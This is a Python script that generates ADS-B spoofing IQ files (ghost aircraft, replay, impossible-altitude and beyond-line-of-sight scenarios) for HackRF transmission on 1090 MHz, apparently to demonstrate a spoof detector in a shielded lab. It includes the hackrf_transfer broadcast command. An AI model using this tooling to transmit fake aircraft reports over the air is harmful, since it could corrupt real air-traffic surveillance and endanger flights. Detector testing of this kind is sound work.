#!/usr/bin/env python3
"""
ADS-B Demo Traffic Generator
==============================

Generates IQ sample files for HackRF transmission using the ADS-B encoder.
Produces multiple scenarios (legitimate flight, ghost aircraft, replay
attack, impossible parameters, beyond line-of-sight) as separate .iq8s
files that the TX operator can broadcast one at a time.

The RX operator runs dump1090 + adsb_spoof_detector.py simultaneously
to demonstrate detection of each attack type.

Usage:
    # Generate all scenario files into an output directory:
    python3 demo_traffic_gen.py --lat 43.0846 --lon -77.6743 --outdir demo_samples

    # Generate a single scenario:
    python3 demo_traffic_gen.py --lat 43.0846 --lon -77.6743 --scenario ghost

    # List available scenarios:
    python3 demo_traffic_gen.py --list

    # Transmit a generated file with HackRF (1090 MHz, 2M samples/s):
    hackrf_transfer -t demo_samples/01_legitimate.iq8s -f 1090000000 -s 2000000 -x 40

Requirements:
    Python 3.8+, numpy, updatedADSBEncoder.py in the same directory
"""

from __future__ import annotations

import argparse
import math
import os
import struct
import sys
import time

import numpy

from updatedADSBEncoder import (
    df17_pos_rep_encode,
    frame_1090es_ppm_modulate,
    hackrf_raw_IQ_format,
)
from geolocation import get_location

#  ENCODER HELPERS

# Default ADS-B message parameters
CA = 5        # capability (airborne with alert)
TC = 11       # type code (airborne position, barometric alt)
SS = 0        # surveillance status
NICSB = 0     # NIC supplement-B
TIME_BIT = 0  # time synchronization flag
SURFACE = False


def encode_position(icao: int, lat: float, lon: float, alt: float) -> bytearray:
    """
    Encode a single ADS-B position into HackRF-ready IQ samples.
    Returns a bytearray of interleaved 8-bit I/Q samples.
    """
    even_bytes, odd_bytes = df17_pos_rep_encode(
        CA, icao, TC, SS, NICSB, alt, TIME_BIT, lat, lon, SURFACE
    )
    ppm = frame_1090es_ppm_modulate(even_bytes, odd_bytes)
    return hackrf_raw_IQ_format(ppm)


def build_flight_samples(icao: int, waypoints: list[dict],
                         pause_samples: int = 200000) -> bytearray:
    """
    Build a continuous IQ sample stream from a list of waypoints.

    Each waypoint is a dict with keys: lat, lon, alt.
    A pause (silence) is inserted between each transmission to
    simulate the ~0.5s ADS-B update interval at 2 Msps.

    Args:
        icao: 24-bit ICAO address as integer
        waypoints: list of position dicts
        pause_samples: number of zero I/Q sample pairs between messages
                       (at 2 Msps, 200000 pairs ≈ 0.1s — the HackRF
                        replay rate controls actual timing)
    """
    all_samples = bytearray()
    silence = bytearray(pause_samples * 2)  # 2 bytes per sample (I + Q)

    for wp in waypoints:
        iq = encode_position(icao, wp["lat"], wp["lon"], wp["alt"])
        all_samples.extend(iq)
        all_samples.extend(silence)

    return all_samples


def linear_flight_path(start_lat: float, start_lon: float,
                       heading_deg: float, speed_kt: float,
                       alt: float, duration_s: float,
                       interval_s: float = 0.5) -> list[dict]:
    """
    Generate a straight-line flight path as a list of waypoints.

    Args:
        start_lat, start_lon: starting position (degrees)
        heading_deg: true heading (degrees)
        speed_kt: ground speed in knots
        alt: altitude in feet
        duration_s: how many seconds of flight to simulate
        interval_s: time between position reports
    """
    waypoints = []
    speed_deg_per_s = (speed_kt / 3600) * (1 / 60)  # rough NM/s → deg/s
    hdg_rad = math.radians(heading_deg)
    dlat = math.cos(hdg_rad) * speed_deg_per_s
    dlon = math.sin(hdg_rad) * speed_deg_per_s / math.cos(math.radians(start_lat))

    steps = int(duration_s / interval_s)
    for i in range(steps):
        waypoints.append({
            "lat": start_lat + dlat * i * interval_s,
            "lon": start_lon + dlon * i * interval_s,
            "alt": alt,
        })

    return waypoints

#  SCENARIOS

def scenario_legitimate(rx_lat: float, rx_lon: float) -> tuple[str, str, bytearray]:
    """
    Scenario 1: Normal commercial flight.
    Smooth trajectory, reasonable speed/altitude, within range.
    The detector should classify this as CLEAN.
    """
    icao = 0xA1B2C3
    waypoints = linear_flight_path(
        start_lat=rx_lat + 0.3,
        start_lon=rx_lon + 0.2,
        heading_deg=45,
        speed_kt=450,
        alt=35000,
        duration_s=30,
        interval_s=0.5,
    )
    samples = build_flight_samples(icao, waypoints)
    return (
        "01_legitimate.iq8s",
        "Legitimate flight (ICAO A1B2C3) — smooth trajectory at FL350, 450kt, heading 045. Should be CLEAN.",
        samples,
    )


def scenario_ghost(rx_lat: float, rx_lon: float) -> tuple[str, str, bytearray]:
    """
    Scenario 2: Ghost aircraft with sudden position jump.
    Flies normally then teleports 100+ NM — triggers trajectory
    continuity and speed inconsistency alerts.
    """
    icao = 0xDEAD01

    # Normal segment
    normal = linear_flight_path(
        start_lat=rx_lat + 0.2,
        start_lon=rx_lon + 0.1,
        heading_deg=90,
        speed_kt=400,
        alt=28000,
        duration_s=10,
        interval_s=0.5,
    )

    # Jump to a position ~2 degrees away (well over 100 NM)
    jumped = linear_flight_path(
        start_lat=rx_lat + 2.0,
        start_lon=rx_lon + 2.0,
        heading_deg=90,
        speed_kt=400,
        alt=28000,
        duration_s=10,
        interval_s=0.5,
    )

    samples = build_flight_samples(icao, normal + jumped)
    return (
        "02_ghost_aircraft.iq8s",
        "Ghost aircraft (ICAO DEAD01) — normal flight then 100+ NM position jump. Should trigger SPOOFED.",
        samples,
    )


def scenario_replay(rx_lat: float, rx_lon: float) -> tuple[str, str, bytearray]:
    """
    Scenario 3: Replay attack.
    The same position is transmitted repeatedly with no movement,
    simulating a captured-and-replayed message. Triggers duplicate
    detection and timing anomalies.
    """
    icao = 0xBEEF42

    # Repeat the exact same position many times
    replayed_pos = {
        "lat": rx_lat + 0.3,
        "lon": rx_lon - 0.2,
        "alt": 31000,
    }
    waypoints = [replayed_pos] * 30  # 30 identical messages

    # Use a shorter pause to simulate rapid-fire replay
    samples = build_flight_samples(icao, waypoints, pause_samples=50000)
    return (
        "03_replay_attack.iq8s",
        "Replay attack (ICAO BEEF42) — same position repeated 30 times in rapid succession. Should trigger SPOOFED.",
        samples,
    )


def scenario_impossible(rx_lat: float, rx_lon: float) -> tuple[str, str, bytearray]:
    """
    Scenario 4: Impossible flight parameters.
    Aircraft at 55,000 ft (above max plausible) with extreme altitude
    changes between updates. Triggers geometry and trajectory alerts.
    """
    icao = 0xFA4E99

    waypoints = []
    base_lat = rx_lat + 0.1
    base_lon = rx_lon

    # Altitude oscillates wildly between updates
    for i in range(20):
        alt = 55000 if i % 2 == 0 else 5000
        waypoints.append({
            "lat": base_lat + i * 0.001,
            "lon": base_lon + i * 0.0005,
            "alt": alt,
        })

    samples = build_flight_samples(icao, waypoints)
    return (
        "04_impossible_params.iq8s",
        "Impossible parameters (ICAO FA4E99) — altitude oscillates 55000/5000 ft every update. Should trigger SPOOFED.",
        samples,
    )


def scenario_far_away(rx_lat: float, rx_lon: float) -> tuple[str, str, bytearray]:
    """
    Scenario 5: Aircraft far beyond line-of-sight.
    Low altitude aircraft reporting a position ~250 NM away from the
    receiver — physically impossible to receive at that range/altitude.
    Triggers geometry (LoS) alerts.
    """
    icao = 0xFAB001

    waypoints = linear_flight_path(
        start_lat=rx_lat + 3.0,
        start_lon=rx_lon + 4.0,
        heading_deg=45,
        speed_kt=250,
        alt=5000,
        duration_s=15,
        interval_s=0.5,
    )

    samples = build_flight_samples(icao, waypoints)
    return (
        "05_beyond_los.iq8s",
        "Beyond line-of-sight (ICAO FAB001) — low altitude, ~250 NM from receiver. Should trigger SPOOFED.",
        samples,
    )


SCENARIOS = {
    "legitimate": scenario_legitimate,
    "ghost": scenario_ghost,
    "replay": scenario_replay,
    "impossible": scenario_impossible,
    "far": scenario_far_away,
}


#Entry

def main():
    parser = argparse.ArgumentParser(
        description="ADS-B Demo Traffic Generator — produces IQ sample files for HackRF transmission",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Generate all scenarios (auto-detect location):
  python3 demo_traffic_gen.py

  # Generate all scenarios with explicit coordinates:
  python3 demo_traffic_gen.py --lat 43.0846 --lon -77.6743

  # Generate one scenario:
  python3 demo_traffic_gen.py --scenario ghost

  # Transmit with HackRF (in shielded lab only!):
  hackrf_transfer -t demo_samples/02_ghost_aircraft.iq8s -f 1090000000 -s 2000000 -x 40
        """,
    )
    parser.add_argument("--lat", type=float, default=None,
                        help="Receiver latitude (auto-detected if omitted)")
    parser.add_argument("--lon", type=float, default=None,
                        help="Receiver longitude (auto-detected if omitted)")
    parser.add_argument("--outdir", default="demo_samples",
                        help="Output directory for IQ files (default: demo_samples)")
    parser.add_argument("--scenario", choices=list(SCENARIOS.keys()),
                        help="Generate only this scenario (default: all)")
    parser.add_argument("--list", action="store_true",
                        help="List available scenarios and exit")

    args = parser.parse_args()

    if args.list:
        print("\nAvailable scenarios:\n")
        for name, fn in SCENARIOS.items():
            print(f"  {name:15s} — {(fn.__doc__ or '').strip().splitlines()[0]}")
        print()
        sys.exit(0)

    # Resolve location
    if args.lat is not None and args.lon is not None:
        rx_lat, rx_lon = args.lat, args.lon
        loc_source = "manual"
    else:
        print("  No --lat/--lon provided, auto-detecting location via IP...")
        result = get_location()
        if result is None:
            print("  ERROR: Could not auto-detect location. Please provide --lat and --lon manually.")
            sys.exit(1)
        rx_lat, rx_lon, loc_desc = result
        loc_source = f"auto-detected ({loc_desc})"

    os.makedirs(args.outdir, exist_ok=True)

    if args.scenario:
        to_generate = {args.scenario: SCENARIOS[args.scenario]}
    else:
        to_generate = SCENARIOS

    print(f"  Receiver reference: ({rx_lat:.4f}, {rx_lon:.4f}) [{loc_source}]")
    print(f"  Output directory:   {args.outdir}/")
    print()
    print("WARNING: Only transmit in a shielded/isolated lab")
    print()

    for name, fn in to_generate.items():
        filename, description, samples = fn(rx_lat, rx_lon)
        filepath = os.path.join(args.outdir, filename)

        with open(filepath, "wb") as f:
            f.write(samples)

        size_kb = len(samples) / 1024
        print(f"  ✓ {filename:30s} ({size_kb:7.1f} KB)")
        print(f"    {description}")
        print()

    print("─" * 60)
    print("  Transmit with:")
    print(f"    hackrf_transfer -t {args.outdir}/<file>.iq8s -f 1090000000 -s 2000000 -x 40")
    print()
    print("  Detect with (on the RX machine):")
    print(f"    ./dump1090 --net --interactive")
    print(f"    python3 adsb_spoof_detector.py")
    print("─" * 60)


if __name__ == "__main__":
    main()